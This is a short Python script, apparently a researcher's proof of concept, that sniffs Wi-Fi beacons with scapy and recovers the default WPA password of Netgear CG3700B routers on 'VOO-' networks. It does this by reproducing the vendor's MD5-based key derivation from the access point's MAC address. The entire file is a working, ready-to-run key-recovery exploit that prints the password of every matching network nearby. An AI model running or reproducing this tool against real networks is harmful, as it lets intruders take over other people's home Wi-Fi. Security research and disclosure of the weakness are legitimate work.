#!/usr/bin/env python
'''
Network Sniffer with Automatic PSK Guesser for Netgear CG3700B.

Author: Quentin Kaiser <kaiserquentin@gmail.com>
'''
import hashlib
import struct
from scapy.all import *

# these are observed netgear MAC

NETGEAR_OUIS = [
    "10:0d:7f",
    "a4:2b:8c",
    "00:14:6c",
    "00:1b:2f",
    "00:1e:2a",
    "00:1f:33",
    "00:8e:f2",
    "20:0c:c8"
]

ap_list = {}

def is_netgear(ap_mac):
    return ap_mac[0:8] in NETGEAR_OUIS

def is_voo(ssid):
    return "VOO-" in ssid

def gen_psk(ssid, ap_mac):
    for i in range(0, pow(16, 2)):
        tmp_mac = "0x%s%02X" % (
            ap_mac[0:14].upper().replace(":", ""),
            i
        )
        tmp_hash = hashlib.md5(tmp_mac).digest()
        tmp_ssid = "VOO-"
        tmp_ssid += ''.join([str(struct.unpack(">B", tmp_hash[j])[0] % 10) for j in range(0, 6)])
        if tmp_ssid == ssid:
            psk = ''.join([chr((struct.unpack(">B", tmp_hash[k])[0] % 0x1a) * 0x1000000 + 0x41000000 >> 0x18) for k in range(5, 13)])
            return psk

def PacketHandler(pkt) :
    if pkt.haslayer(Dot11):
        if pkt.type == 0 and pkt.subtype == 8:
            if is_netgear(pkt.addr2) and is_voo(pkt.info) and pkt.info not in ap_list:
                psk = gen_psk(pkt.info, pkt.addr2)
                ap_list[pkt.info] = psk
                print("AP MAC: %s with SSID: %s (PSK: %s)" %(pkt.addr2, pkt.info, psk))

if __name__ == "__main__":
    sniff(iface="wlp6s0mon", prn = PacketHandler)
